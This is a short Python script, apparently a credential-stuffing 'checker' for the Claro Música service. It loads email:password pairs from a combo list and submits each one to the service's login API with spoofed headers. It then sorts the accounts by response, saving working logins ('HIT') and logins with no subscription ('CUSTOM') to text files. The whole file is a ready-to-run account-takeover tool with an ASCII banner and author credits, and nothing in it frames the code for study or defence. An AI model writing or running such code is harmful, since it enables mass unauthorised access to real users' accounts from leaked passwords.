import requests
import bs4
import json
import colorama
from colorama import Fore, Style
colorama.init()
import os
import sys



def initi():
    def check(email,password):
    
        headers = {
            "Host": "api.claromusica.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Accept-Encoding": "br, gzip, deflate",
            "Connection": "keep-alive",
            "X-NewRelic-ID": "UgECVVNRGwsJUFZVAwE=",
            "Version": "4.0",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
            "Referer": "claromusica.com",
            "Content-Length": "47",
            "Accept-Language": "es-es",
            
        }
        
        data = {
            "email": email,
            "password": password
            
            
            
        }
        

        login = requests.post("https://api.claromusica.com/api/profile/loginEmailAndPassword/appId/515fc942ae977cdfdd2ac22917b2da93/appVersion/00022fb5f6c2e3872c471fec63239d99/ct/CO", data=data, headers=headers)


    
        
        if "EMAIL_OR_PASSWORD_INVALID" in login.text:
            print(Fore.RED + 'BAD: '+email+':'+password + Fore.RESET)
        elif 'subscriptions":[]' in login.text:
                print(Fore.YELLOW +'CUSTOM: '+email+':'+password +Fore.RESET)
                file = open('custom.txt','a')
                file.write('CUSTOM: '+email+':'+password+'\n')
        elif "profile" in login.text:
            print(Fore.GREEN + 'HIT: '+email+':'+password + Fore.RESET)
            file2 = open('hit.txt','a')
            file2.write('HIT: '+email+':'+password+'\n')
            
            
        else:
            pass


    file = open('combo.txt','r', encoding="utf8").readlines()
    for i in file:
        #num = None
        #num = n
        #os.system(f'title Claro_Music_Checker       CPM: {num}')
        
        
        seq = i.strip()
        acc = seq.split(':')
        if len(acc) >= 2:
            check(acc[0], acc[1])
        
        



print(Fore.CYAN + '''
░█████╗░██╗░░░░░░█████╗░██████╗░░█████╗░  ███╗░░░███╗██╗░░░██╗░██████╗██╗░█████╗░
██╔══██╗██║░░░░░██╔══██╗██╔══██╗██╔══██╗  ████╗░████║██║░░░██║██╔════╝██║██╔══██╗
██║░░╚═╝██║░░░░░███████║██████╔╝██║░░██║  ██╔████╔██║██║░░░██║╚█████╗░██║██║░░╚═╝
██║░░██╗██║░░░░░██╔══██║██╔══██╗██║░░██║  ██║╚██╔╝██║██║░░░██║░╚═══██╗██║██║░░██╗
╚█████╔╝███████╗██║░░██║██║░░██║╚█████╔╝  ██║░╚═╝░██║╚██████╔╝██████╔╝██║╚█████╔╝
░╚════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░  ╚═╝░░░░░╚═╝░╚═════╝░╚═════╝░╚═╝░╚════╝░''')
print(Fore.RED + 'Checker by Criftcking_Real And GhostHat_Real' + Fore.RESET)
print()
print()
print(Fore.YELLOW + '[Elige Una Opcion>')
var = print(Fore.YELLOW + '[1]-Iniciar\n[2]-Salir')

valor1 = int(input(Fore.BLUE + 'Opcion: >'))

if valor1 == 1:
    os.system('cls')
    initi()
else:
    pass

